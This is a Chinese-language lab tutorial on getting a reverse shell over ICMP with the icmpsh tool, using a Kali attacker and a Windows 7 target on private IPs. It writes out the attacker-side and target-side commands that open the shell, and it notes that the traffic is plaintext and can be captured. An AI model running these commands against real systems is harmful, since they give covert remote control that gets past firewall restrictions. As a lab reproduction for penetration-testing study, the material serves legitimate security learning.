一、概述

通常，网络管理员会使用各种各样的防火墙，通过访问控制列表来限制网络访问，对渗透测试会造成非常大的困难，而为了来获得reverse
shell，而ICMP就是解决这个问题的重点，icmpsh是一个简单的reverse ICMP shell，它分别用C
（icmpsh-m.c）、Perl（icmpsh-m.pl）、Python（icmpsh_m.py）使win32.slave兼容原始POSIX。它比其它类似的开源工具的主要优点是，它并不需要管理员权限就能运行到目标机器上。该工具简洁，方便和便于携带（跨平台）。而且该工具是主要针对Windows的，它是他是一个C/S架构：slave（客户端）它是用C写的只能在Windows上运行，master（服务器）是跨平台的，然而目前已将C和Perl已经移植到Python上了。

二、环境搭建

操作系统| IP地址| 用途  
---|---|---  
Win7 旗舰版| 192.168.37.143| 靶机  
Kali| 192.168.37.131| 攻击机  
  
三、过程复现

1、获取利用ICMP协议反弹shell的poc

POC获取地址：https://github.com/inquisb/icmpsh

文件夹内容如下图所示：

![1688554614_64a54c76800c69ea3cc97.png!small](https://image.3001.net/images/20230705/1688554614_64a54c76800c69ea3cc97.png!small)

2、将icmpsh-master文件夹移动至kali攻击机下，使用命令：

sysctl -w net.ipv4.icmp_echo_ignore_all=1 关闭kali的icmp回显，结果如下图所示：

![1688554678_64a54cb60e0dd401eea0b.png!small](https://image.3001.net/images/20230705/1688554678_64a54cb60e0dd401eea0b.png!small)

3、在kali攻击机icmp-master文件夹下使用命令运行py脚本，其中前面是攻击机（kali） IP，后面是被攻击机（Win7）IP

命令：./icmpsh_m.py 192.168.37.131 192.168.37.143

结果如下图所示：

![1688554697_64a54cc9e882cd030abf0.png!small](https://image.3001.net/images/20230705/1688554697_64a54cc9e882cd030abf0.png!small)

4、将imcpsh-master文件夹中的exe应用程序通过渗透技术手段上传至靶机（Win7）操作系统中，如下图所示：

![1688554721_64a54ce1180b2d3282370.png!small](https://image.3001.net/images/20230705/1688554721_64a54ce1180b2d3282370.png!small)

5、保持靶机（Win7）操作系统的防火墙为开启状态，如下图所示：

![1688554747_64a54cfb6cc36696b7bbc.png!small](https://image.3001.net/images/20230705/1688554747_64a54cfb6cc36696b7bbc.png!small)

6、在靶机（Win7）操作系统下输入命令：exe -t 192.168.37.131 -d 500 -b 30 -s 128

注：命令中的IP为攻击机（Kali）ip，靶机下输入命令结果如下图所示：

![1688554777_64a54d19a59e6b68fc660.png!small](https://image.3001.net/images/20230705/1688554777_64a54d19a59e6b68fc660.png!small)

7、在靶机（Win7）下执行上图所示的命令后，攻击机（Kali）就能成功接收到通过icmp协议反弹的shell。

在获取的shell下输入命令ipconfig，可以成功获取到靶机（Win7）的ip地址信息，结果如下图所示：

![1688554801_64a54d3172a041719633c.png!small](https://image.3001.net/images/20230705/1688554801_64a54d3172a041719633c.png!small)

通过验证，过程测试成功。同时，经过抓包分析后，由于该漏洞利用的是ICMP明文协议，通过抓包可以获取明文传输内容。

![1688554893_64a54d8dd71f8acae568a.png!small](https://image.3001.net/images/20230705/1688554893_64a54d8dd71f8acae568a.png!small)

